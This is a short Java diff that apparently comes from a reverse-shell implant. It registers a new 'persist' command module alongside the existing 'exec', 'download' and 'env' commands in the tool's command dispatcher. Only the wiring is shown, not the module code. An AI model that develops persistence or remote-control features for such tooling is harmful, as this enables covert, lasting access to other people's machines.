@@ -5,6 +5,7 @@ import java.util.HashMap;
 import java.util.Map;
 import reverse_shell.modules.DownloadCommand;
 import reverse_shell.modules.EnvCommand;
+import reverse_shell.modules.PersistCommand;
 
 
 import reverse_shell.modules.ShellCommand;
@@ -16,6 +17,7 @@ public class Dispatcher {
         commands.put("exec", new ShellCommand());
         commands.put("download", new DownloadCommand());
         commands.put("env", new EnvCommand());
+        commands.put("persist", new PersistCommand());
         // Додаткові модулі додаватимемо тут
     }
 
